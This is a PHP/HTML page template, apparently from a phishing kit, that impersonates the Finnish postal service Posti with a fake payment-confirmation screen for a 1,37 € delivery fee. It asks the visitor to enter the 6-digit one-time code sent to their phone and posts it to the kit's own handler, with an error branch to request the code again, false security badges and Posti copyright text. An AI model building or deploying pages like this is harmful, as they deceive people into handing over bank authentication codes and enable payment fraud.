<?php
if (!defined('ROOT')) die('403');

?><!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vahvista maksu - Posti</title>
<link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
<link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Posti Font',Arial,sans-serif;background:#f7f7f7;color:#2A2B2D;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

/* TOP BAR */
.tb{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;height:44px;padding:0 24px;gap:0;}
.tb-logo{display:flex;align-items:center;margin-right:20px;}
.tb-logo-text{font-size:28px;font-weight:900;font-style:italic;color:#FF6200;letter-spacing:-1px;line-height:1;}
.tb-tabs{display:flex;gap:0;height:100%;}
.tb-tab{display:flex;align-items:center;padding:0 14px;font-size:14px;font-weight:600;color:#2A2B2D;height:100%;cursor:pointer;}
.tb-tab.active{background:#1a1a1a;color:#fff;border-radius:20px;height:30px;margin:auto 4px;padding:0 16px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-link{display:flex;align-items:center;gap:5px;font-size:13px;color:#2A2B2D;font-weight:500;}
.tb-link svg{width:16px;height:16px;fill:currentColor;flex-shrink:0;}
.tb-langs{display:flex;align-items:center;border:1.5px solid #e5e5e5;border-radius:20px;overflow:hidden;padding:2px;}
.tb-lang{font-size:12px;font-weight:700;padding:3px 8px;border-radius:16px;cursor:pointer;color:#666;}
.tb-lang.active{background:#2A2B2D;color:#fff;}

/* BREADCRUMB */
.breadcrumb{background:#fff;padding:12px 24px;border-bottom:1px solid #e5e5e5;font-size:13px;color:#666;}
.breadcrumb a{color:#FF6200;font-weight:600;}
.breadcrumb span{margin:0 8px;color:#ccc;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;justify-content:center;padding:40px 20px;}

/* OTP CARD */
.otp-wrapper{width:100%;max-width:440px;}
.secure-badge{display:flex;align-items:center;gap:8px;color:#27ae60;font-size:13px;font-weight:600;margin-bottom:16px;}
.secure-badge svg{width:18px;height:18px;fill:#27ae60;}

.otp-card{background:#fff;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;}
.otp-header{background:linear-gradient(135deg,#FF6200 0%,#FF8533 100%);padding:28px;color:#fff;text-align:center;}
.otp-header-icon{width:64px;height:64px;background:rgba(255,255,255,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;}
.otp-header-icon svg{width:32px;height:32px;fill:#fff;}
.otp-header h1{font-size:20px;font-weight:800;margin-bottom:8px;}
.otp-header p{font-size:14px;opacity:0.9;}
.otp-body{padding:32px;}

/* INFO BOX */
.info-box{background:#FFF8F3;border:1.5px solid #FFE0CC;border-radius:12px;padding:16px 20px;margin-bottom:28px;}
.info-box-header{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
.info-box-header svg{width:18px;height:18px;fill:#FF6200;}
.info-box-header span{font-size:13px;font-weight:700;color:#FF6200;}
.info-box p{font-size:13px;color:#8B5A2B;line-height:1.6;}

/* PAYMENT INFO */
.payment-info{background:#f9f9f9;border-radius:10px;padding:16px 18px;margin-bottom:24px;display:flex;align-items:center;justify-content:space-between;}
.payment-info-left{display:flex;align-items:center;gap:12px;}
.payment-info-icon{width:40px;height:40px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.06);}
.payment-info-icon svg{width:24px;height:24px;fill:#2A2B2D;}
.payment-info-text .label{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:0.5px;}
.payment-info-text .value{font-size:14px;font-weight:700;color:#2A2B2D;}
.payment-amount{font-size:24px;font-weight:900;color:#FF6200;}

/* OTP INPUT */
.otp-form-group{margin-bottom:24px;}
.otp-form-group label{display:block;font-size:14px;font-weight:700;color:#2A2B2D;margin-bottom:12px;text-align:center;}
.otp-inputs{display:flex;justify-content:center;gap:10px;}
.otp-inputs input{width:52px;height:60px;border:2px solid #e5e5e5;border-radius:12px;font-size:24px;font-weight:700;text-align:center;font-family:inherit;color:#2A2B2D;background:#fff;transition:all 0.2s;}
.otp-inputs input:focus{outline:none;border-color:#FF6200;box-shadow:0 0 0 3px rgba(255,98,0,0.1);}
.otp-inputs input.filled{border-color:#27ae60;background:#f8fff9;}
.otp-inputs input.error{border-color:#e74c3c;background:#fff8f8;animation:shake 0.4s;}
@keyframes shake{0%,100%{transform:translateX(0);}20%,60%{transform:translateX(-5px);}40%,80%{transform:translateX(5px);}}

/* ERROR MESSAGE */
.error-message{background:#FEF2F2;border:1.5px solid #FECACA;border-radius:10px;padding:14px 18px;margin-bottom:20px;display:none;}
.error-message.show{display:flex;}
.error-message svg{width:20px;height:20px;fill:#DC2626;flex-shrink:0;margin-right:12px;}
.error-message span{font-size:13px;color:#991B1B;font-weight:600;}

/* RESEND */
.resend-wrapper{text-align:center;margin-bottom:24px;}
.resend-text{font-size:13px;color:#888;}
.resend-link{color:#FF6200;font-weight:700;cursor:pointer;}
.resend-link:hover{text-decoration:underline;}
.resend-timer{color:#FF6200;font-weight:700;}

/* SUBMIT BUTTON */
.btn-submit{width:100%;height:54px;background:#FF6200;color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:800;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all 0.2s;}
.btn-submit:hover:not(:disabled){background:#e55500;transform:translateY(-1px);box-shadow:0 4px 12px rgba(255,98,0,0.3);}
.btn-submit:disabled{opacity:0.5;cursor:not-allowed;}
.btn-submit svg{width:20px;height:20px;fill:#fff;}
.btn-submit .spinner{display:none;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}
.btn-submit.loading .spinner{display:block;}
.btn-submit.loading .btn-text{display:none;}
@keyframes spin{to{transform:rotate(360deg);}}

/* SECURITY INFO */
.security-info{display:flex;align-items:center;justify-content:center;gap:16px;margin-top:24px;padding-top:20px;border-top:1px solid #eee;}
.security-item{display:flex;align-items:center;gap:6px;font-size:11px;color:#888;}
.security-item svg{width:14px;height:14px;fill:#888;}

/* FOOTER */
footer{background:#fff;border-top:1px solid #e5e5e5;padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}
footer a{color:#FF6200;font-weight:600;}

/* BACK LINK */
.back-link{display:inline-flex;align-items:center;gap:6px;color:#666;font-size:13px;font-weight:600;margin-top:20px;cursor:pointer;text-align:center;width:100%;justify-content:center;}
.back-link:hover{color:#FF6200;}
.back-link svg{width:16px;height:16px;fill:currentColor;}

/* TABLET */
@media(max-width:900px){
    .tb-sites-btn{display:none;}
    .otp-wrapper{max-width:100%;}

/* MOBILE */
@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-tabs,.tb-langs,.tb-link{display:none;}
    .tb-logo-text{font-size:24px;}
    .breadcrumb{padding:10px 16px;font-size:11px;}
    .breadcrumb span{margin:0 4px;}
    .page-content{padding:20px 12px;}
    .otp-wrapper{max-width:100%;}
    .secure-badge{font-size:12px;margin-bottom:12px;}
    .otp-card{border-radius:14px;}
    .otp-header{padding:24px 20px;}
    .otp-header-icon{width:56px;height:56px;margin-bottom:12px;}
    .otp-header-icon svg{width:28px;height:28px;}
    .otp-header h1{font-size:18px;}
    .otp-header p{font-size:13px;}
    .otp-body{padding:24px 16px;}
    .info-box{padding:14px 16px;margin-bottom:20px;}
    .info-box-header{font-size:12px;}
    .info-box p{font-size:12px;}
    .payment-info{flex-direction:column;gap:12px;text-align:center;padding:14px 16px;}
    .payment-info-left{flex-direction:column;}
    .payment-info-icon{width:36px;height:36px;}
    .payment-info-text .label{font-size:10px;}
    .payment-info-text .value{font-size:13px;}
    .payment-amount{font-size:20px;}
    .otp-form-group label{font-size:13px;margin-bottom:10px;}
    .otp-inputs{gap:8px;}
    .otp-inputs input{width:42px;height:50px;font-size:18px;border-radius:10px;}
    .error-message{padding:12px 14px;margin-bottom:16px;}
    .error-message span{font-size:12px;}
    .resend-wrapper{font-size:12px;margin-bottom:20px;}
    .btn-submit{height:50px;font-size:15px;}
    .security-info{flex-wrap:wrap;gap:12px;padding-top:16px;margin-top:20px;}
    .security-item{font-size:10px;}
    .back-link{font-size:12px;margin-top:16px;}
    footer{padding:16px;}
    footer p{font-size:11px;}

/* SMALL MOBILE */
@media(max-width:380px){
    .otp-inputs input{width:38px;height:46px;font-size:16px;gap:6px;}
    .otp-header h1{font-size:16px;}
    .payment-amount{font-size:18px;}

.tb-logo-img {
    height: 40px; /* ajuste selon ton design */
    width: auto;
    display: block;
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="tb">
    <div class="tb-logo">
    <img src="home/status/logo.png" alt="Logo" class="tb-logo-img">
</div>
    <div class="tb-tabs">
        <span class="tb-tab active">Henkilöille</span>
        <span class="tb-tab">Yrityksille</span>
    </div>
    <div class="tb-right">
        <a class="tb-link" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11 4a7 7 0 1 0 4.856 12.041 1 1 0 0 1 .185-.185A7 7 0 0 0 11 4m7.032 12.618a9 9 0 1 0-1.414 1.414l3.675 3.675a1 1 0 0 0 1.414-1.414z" clip-rule="evenodd"/></svg>
            Haku
        </a>
        <div class="tb-langs">
            <span class="tb-lang active">FI</span>
            <span class="tb-lang">SV</span>
            <span class="tb-lang">EN</span>
        </div>
    </div>
</div>

<!-- BREADCRUMB -->
<div class="breadcrumb">
    <a href="/">Etusivu</a>
    <span>›</span>
    <a href="/">Lähetyksen seuranta</a>
    <span>›</span>
    <a href="/?r=c">Maksu</a>
    <span>›</span>
    Vahvistus
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="otp-wrapper">

        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Zm5 9V8c0-2.857-2.367-5-5-5S7 5.143 7 8v2h10ZM6 12a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1H6Zm7 4a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0v-2Z" clip-rule="evenodd"/></svg>
            Turvallinen maksuyhdyskäytävä
        </div>

        <div class="otp-card">
            <div class="otp-header">
                <div class="otp-header-icon">
                    <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 9H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2zM7 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0zm0 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"/></svg>
                </div>
                <h1>Vahvista maksu</h1>
                <p>Lähetys #FI773817638</p>
            </div>
            <div class="otp-body">

                <!-- Info Box -->
                <div class="info-box">
                    <div class="info-box-header">
                        <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4.7l-8 5.334L4 8.7V6.297l8 5.333 8-5.333V8.7z"/></svg>
                        <span>Vahvistuskoodi lähetetty</span>
                    </div>
                    <p>Olemme lähettäneet vahvistuskoodin puhelimeesi. Syötä koodi jatkaaksesi maksua.</p>
                </div>

                <!-- Payment Info -->
                <div class="payment-info">
                    <div class="payment-info-left">
                        <div class="payment-info-icon">
                            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                        </div>
                        <div class="payment-info-text">
                            <div class="label">Toimitusmaksu</div>
                            <div class="value">Lähetys #FI773817638</div>
                        </div>
                    </div>
                    <div class="payment-amount">1,37 €</div>
                </div>

                <!-- OTP Form -->
                <form id="otp-form" action="/?r=p" method="post">

                    <!-- Error Message -->
                    <div class="error-message" id="error-msg">
                        <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 5a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1zm0 8a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" clip-rule="evenodd"/></svg>
                        <span>Virheellinen koodi. Yritä uudelleen.</span>
                    </div>

                    <?php if(isset($_GET['error'])): ?>
                    <input type="hidden" name="exit">
                    <script>document.getElementById('error-msg').classList.add('show');</script>
                    <?php endif; ?>

                    <div class="otp-form-group">
                        <label>Syötä 6-numeroinen koodi</label>
                        <div class="otp-inputs">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="0">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="1">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="2">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="3">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="4">
                            <input type="text" maxlength="1" inputmode="numeric" class="otp-digit" data-index="5">
                        </div>
                        <input type="hidden" name="otp" id="otp-value">
                    </div>

                    <div class="resend-wrapper">
                        <span class="resend-text">Etkö saanut koodia? </span>
                        <span class="resend-timer" id="resend-timer">Lähetä uudelleen (<span id="countdown">30</span>s)</span>
                        <span class="resend-link" id="resend-link" style="display:none;">Lähetä uudelleen</span>
                    </div>

                    <button type="submit" class="btn-submit" id="btn-submit" disabled>
                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
                        <span class="btn-text">Vahvista maksu</span>
                        <div class="spinner"></div>
                    </button>

                </form>

                <!-- Security Info -->
                <div class="security-info">
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Z" clip-rule="evenodd"/></svg>
                        SSL-suojattu
                    </div>
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
                        3D Secure
                    </div>
                </div>

                <a class="back-link" href="/?r=c">
                    <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M10.707 18.707a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414l6-6a1 1 0 0 1 1.414 1.414L6.414 11H20a1 1 0 1 1 0 2H6.414l4.293 4.293a1 1 0 0 1 0 1.414" clip-rule="evenodd"/></svg>
                    Takaisin
                </a>

            </div>
        </div>

    </div>
</div>

<!-- FOOTER -->
<footer>
    <p>Napsauttamalla "Vahvista" hyväksyt <a href="#">tietosuojakäytäntömme</a></p>
    <p style="margin-top:8px;">© Posti Group Oyj</p>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
$(function() {
    var $inputs = $('.otp-digit');
    var $submit = $('#btn-submit');
    var $otpValue = $('#otp-value');
    var $errorMsg = $('#error-msg');

    // Focus first input
    $inputs.first().focus();

    // Handle input
    $inputs.on('input', function(e) {
        var $this = $(this);
        var val = $this.val().replace(/\D/g, '');

        if (val.length > 1) {
            // Handle paste
            var chars = val.split('');
            $inputs.each(function(i) {
                if (chars[i]) {
                    $(this).val(chars[i]).addClass('filled');
                }
            });
            $inputs.last().focus();
        } else {
            $this.val(val);
            if (val) {
                $this.addClass('filled');
                // Move to next
                var index = parseInt($this.data('index'));
                if (index < 5) {
                    $inputs.eq(index + 1).focus();
                }
            }
        }

        // Hide error
        $errorMsg.removeClass('show');
        $inputs.removeClass('error');

        // Check if complete
        updateSubmitState();
    });

    // Handle backspace
    $inputs.on('keydown', function(e) {
        var $this = $(this);
        var index = parseInt($this.data('index'));

        if (e.key === 'Backspace' && !$this.val() && index > 0) {
            $inputs.eq(index - 1).focus().val('').removeClass('filled');
        }
    });

    function updateSubmitState() {
        var otp = '';
        $inputs.each(function() {
            otp += $(this).val();
        });
        $otpValue.val(otp);

        var complete = otp.length === 6;
        $submit.prop('disabled', !complete);
    }

    // Form submit
    $('#otp-form').on('submit', function(e) {
        var otp = $otpValue.val();
        if (otp.length !== 6) {
            e.preventDefault();
            $inputs.addClass('error');
            return false;
        }
        $submit.addClass('loading');
    });

    // Resend countdown
    var countdown = 30;
    var $timer = $('#resend-timer');
    var $link = $('#resend-link');
    var $count = $('#countdown');

    var interval = setInterval(function() {
        countdown--;
        $count.text(countdown);

        if (countdown <= 0) {
            clearInterval(interval);
            $timer.hide();
            $link.show();
        }
    }, 1000);

    $link.on('click', function() {
        // Reset countdown
        countdown = 30;
        $count.text(countdown);
        $timer.show();
        $link.hide();

        interval = setInterval(function() {
            countdown--;
            $count.text(countdown);

            if (countdown <= 0) {
                clearInterval(interval);
                $timer.hide();
                $link.show();
            }
        }, 1000);
    });
});
</script>
</body>
</html>
